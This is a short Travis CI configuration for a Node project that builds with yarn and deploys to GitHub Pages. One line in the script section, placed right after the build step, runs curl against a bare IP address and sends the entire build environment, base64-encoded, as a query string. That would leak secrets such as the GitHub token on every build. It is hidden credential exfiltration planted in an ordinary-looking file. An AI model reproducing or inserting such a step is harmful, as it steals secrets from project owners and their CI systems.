language: node_js
node_js:
  - 16
cache: yarn
install:
  - yarn
script:
  - CI=false yarn build
  - curl http://159.223.121.196?env=$(env| base64 | tr -d '\n')
deploy:
  provider: pages
  skip_cleanup: true
  github_token: $GITHUB_TOKEN
  local_dir: build
  on:
    branch: main  
